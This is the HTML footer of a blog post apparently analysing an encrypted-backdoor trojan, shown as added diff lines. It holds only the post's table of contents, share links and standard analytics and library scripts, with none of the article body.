+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">详细分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%A4%A7%E8%87%B4%E6%B5%8F%E8%A7%88"><span class="toc-number">3.</span> <span class="toc-text">0x01 大致浏览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x02 详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%A5%8F"><span class="toc-number">4.1.</span> <span class="toc-text">前奏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in"><span class="toc-number">4.2.</span> <span class="toc-text">-in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re"><span class="toc-number">4.3.</span> <span class="toc-text">-re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c"><span class="toc-number">4.4.</span> <span class="toc-text">-c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cc"><span class="toc-number">4.5.</span> <span class="toc-text">-cc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82"><span class="toc-number">4.6.</span> <span class="toc-text">无参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8Dcrack%E5%AF%86%E7%A0%81abcd%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.7.</span> <span class="toc-text">另一种crack密码abcd姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.8.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&text=加密后门的木马分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&is_video=false&description=加密后门的木马分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=加密后门的木马分析&body=Check out this article: https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&name=加密后门的木马分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&t=加密后门的木马分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    0r@nge
+  </div>
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</footer>
+
+    </div>
+
+    
+
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-86660611-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
